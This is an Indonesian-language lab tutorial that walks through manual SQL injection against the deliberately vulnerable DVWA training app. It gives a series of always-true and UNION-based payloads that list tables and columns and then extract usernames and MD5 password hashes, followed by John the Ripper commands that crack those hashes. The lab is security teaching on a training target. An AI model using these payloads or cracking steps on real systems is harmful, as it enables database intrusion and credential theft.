### SQL Injection manual dan John the Ripper

* Apa itu SQL Injection?
  * SQL injection adalah teknik yang sering digunakan untuk menyerang aplikasi berbasis data.
  * Teknik ini dilakukan dengan menyisipkan sebagian statemen SQL ke dalam field dalam sebuat website untuk menjalankan perintah ke dalam database. SQL Injection adalah teknik yang memanfaatkan kelemahan keamanan dalam software aplikasi. 
* Apakah yang disebut dengan SQL Injection Harvesting?
  * SQL Injection Harvesting is where a malicious user supplies SQL statements to render sensitive data such as usernames, passwords, database tables, and more.
  * SQL Injection Harvesting adalah keadaan dimana pengguna memasukkan statement sql untuk mendapatkan data sensitif seperti username, password, tabel database, dan lainnya. 
* Lab Notes
  * Dalam lesson ini kita akan melakukan:
    1. Menyisipkan 'always true' sql statement ke dalam fiel sql injection user id dengan tingkat keamanan rendah.
    2. Mendapatkan username dan password dengan format raw-MD5 dari tabel users.
    3. Menggunakan John the Ripper untuk memecahkan password berformat raw-MD5.

| **Section 1: Login ke dalam DVWA** |
| :--- |


1. Buka browser

2. Login ke DVWA

   * Langkah**:**
     1. Buka firefox
     2. Masukkan ip metasploitable, contoh: [http://192.168.56.102/dvwa/login.php](http://192.168.56.102/dvwa/login.php).
     3. Login: admin
     4. Password: password
     5. Klik Login
   * ![](/assets/lesson6/1.PNG)

| **Section 2: Tetapkan Tingkat Keamanan** |
| :--- |


1. Tetapkan tingkat keamanan DVWA

   * Langkah**:**  
     1. Klik bagian DVWA Security di menu bagian kiri.  
     2. Pilih "low"  
     3. Klik Submit

   * ![](/assets/lesson6/2.PNG)

| **Section 3: Lakukan SQL Injection** |
| :--- |


1. Menu SQL Injection

   * **Langkah:**
     1. Pilih "SQL Injection" dari menu bagian kiri.
   * ![](/assets/lesson6/3.PNG)

2. Injection dasar

   * **Langkah:**
     1. Masukkan "1" ke dalam text box.
     2. Klik Submit.
     3. Akan terlihat informasi user dengan id 1.
   * ![](/assets/lesson6/4.PNG)

3. Always True Scenario

   * **Langkah:**
     1. Masukkan text di bawah ke User ID Textbox.
        * `%' or '0'='0`
     2. Klik Submit
   * ![](/assets/lesson6/5.PNG)

4. Menampilkan versi database

   * **Langkah:**
     1. Masukkan text di bawah ke dalam User ID Textbox.
        * `%' or 0=0 union select null, version() #`
     2. Klik Submit
   * ![](/assets/lesson6/6.PNG)

5. Menampilkan user dari database

   * Langkah**:**  
     1. Masukkan text di bawah ke dalam User ID Textbox.

     * `%' or 0=0 union select null, user() #`

   * ![](/assets/lesson6/7.PNG)

6. Menampilkan nama dari database

   * **Langkah:**
     1. Masukkan text di bawah ke dalam User ID Textbox.
        * `%' or 0=0 union select null, database() #`
   * ![](/assets/lesson6/8.PNG)

7. Menampilkan semua tabel dalam information\_schema

   * **Langkah:**
     1. Masukkan text di bawah ke dalam User ID Textbox.
        * `%' and 1=0 union select null, table_name from information_schema.tables #`
     2. Klik Submit
   * ![](/assets/lesson6/9.PNG)

8. Menampilkan semua tabel user di dalam information\_schema

   * **Langkah:**
     1. Masukkan text di bawah ke dalam User ID Textbox.
        * `%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#`
     2. Klik Submit
   * ![](/assets/lesson6/10.PNG)

9. Menampilkan semua field kolom dalam tabel user di information\_schema

   * **Langkah:**
     1. Masukkan text di bawah ke dalam User ID Textbox.
        * `%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`
     2. Klik Submit
   * ![](/assets/lesson6/11.PNG)

10. Menampilkan semua kolom field pada tabel user di kolom information\_schema.

    * **Langkah:**
      1. Masukkan text di bawah ke dalam ID Textbox.
         * `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
      2. Klik Submit
    * ![](/assets/lesson6/11.PNG)

| **Section 4: Membuat file hash password** |
| :--- |


1. Membuat file hash password

   * **Langkah:**

     1. Highlight admin dan hash password

     2. Klik kanan

     3. Copy

   * ![](/assets/lesson6/12.PNG)

2. Simpan dalam file

   * **Langkah:**

     1. Simpan dalam file dengan format user:password\_hash  
            Contoh:  
                admin:5f4dcc3b5aa765d61d8327deb882cf99

     2. Simpan file

   * ![](/assets/lesson6/13.PNG)

| **Section 5: Menggunakan John the Ripper** |
| :--- |


1. Proof of Lab
   * **Langkah:**
     1. Buka terminal baru
     2. `cd /pentest/passwords/john`
     3. `./john --format=raw-MD5 dvwa_password.txt`
     4. Password akan di crack
     5. Untuk menampilkan password yang sudah di crack lakukan perintah seperti di bawah:
        ```
        john -show -format=raw-MD5 dvwa_password.txt
        ```
   * ![](/assets/lesson6/14.PNG)



